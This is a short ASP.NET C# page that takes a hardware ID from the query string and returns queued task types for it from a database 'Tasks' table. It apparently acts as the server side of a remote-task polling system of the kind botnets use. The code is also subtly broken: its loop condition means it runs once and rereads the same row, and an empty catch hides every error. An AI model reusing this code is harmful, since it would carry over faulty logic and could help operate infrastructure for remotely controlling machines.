using System;
using System.Data.SqlClient;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            string HWID = Request.QueryString["HWID"];
            int Amount;
            string Type = "nop";
            int i = 0;
            FooSpan.InnerText = ";";

            using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
            {
                conn.Open();
                using (SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Tasks WHERE HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", HWID);
                    Amount = (int)cmd.ExecuteScalar();
                }

                do
                {
                    i++;
                    using (SqlCommand cmd = new SqlCommand("SELECT Type FROM Tasks WHERE HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        Type = cmd.ExecuteScalar().ToString();
                        FooSpan.InnerText += Type + ";";
                    }
                } while (i > Amount);
            }
        }
        catch { }
    }
}